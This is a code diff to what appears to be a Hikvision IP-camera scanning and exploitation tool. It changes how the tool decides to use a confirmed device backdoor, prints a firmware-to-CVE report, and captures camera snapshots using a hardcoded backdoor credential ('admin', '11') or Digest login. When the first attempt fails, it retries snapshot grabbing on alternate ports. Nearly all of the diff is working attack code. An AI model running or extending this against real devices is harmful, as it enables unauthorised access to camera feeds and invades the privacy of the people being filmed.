@@ -136,6 +136,9 @@ def gather_extended_intel(
             out["isapi_paths"][key] = {"url": url, "error": str(exc)}
 
     intel = assess_hikvision(host, port=port, auth=auth)
+    from engines.device_cve_checker import print_cve_report
+
+    print_cve_report(intel)
     out["cve_assessments"] = [
         {
             "cve": a.cve_id,
@@ -351,8 +354,9 @@ def run_post_test_workflow(
     ctx.open_ports = open_port_numbers(cached)
 
     auth = ("admin", ctx.digest_password) if ctx.digest_password else None
-    use_backdoor = ctx.backdoor_confirmed
+    use_backdoor = ctx.backdoor_confirmed and not auth
 
+    print("\n[4] CVE INTELLIGENCE (firmware → CVE map)")
     print("\n[5] DEVICE INTELLIGENCE (firmware → CVE / SearchSploit)")
     try:
         ctx.intel_summary = gather_extended_intel(
@@ -378,13 +382,25 @@ def run_post_test_workflow(
     if not skip_snapshots and (use_backdoor or auth):
         print("\n[6] SCREENSHOTS (same IP — backdoor or Digest)")
         try:
+            snap_auth = auth if auth else (("admin", "11") if use_backdoor else None)
             ctx.snapshot_paths = capture_snapshots(
                 ctx.host,
                 ctx.http_port,
-                use_backdoor=use_backdoor and not auth,
-                auth=auth if auth else (("admin", "11") if use_backdoor else None),
+                use_backdoor=use_backdoor,
+                auth=snap_auth,
                 target_dir=td,
             )
+            if not ctx.snapshot_paths and len(ctx.http_ports) > 1:
+                for alt in ctx.http_ports[1:3]:
+                    if alt == ctx.http_port:
+                        continue
+                    print(f"    [*] Retry snapshots on port {alt}...")
+                    ctx.snapshot_paths = capture_snapshots(
+                        ctx.host, alt, use_backdoor=use_backdoor, auth=snap_auth, target_dir=td
+                    )
+                    if ctx.snapshot_paths:
+                        ctx.http_port = alt
+                        break
             if ctx.snapshot_paths:
                 for sp in ctx.snapshot_paths[:6]:
                     print(f"    [+] {sp}")
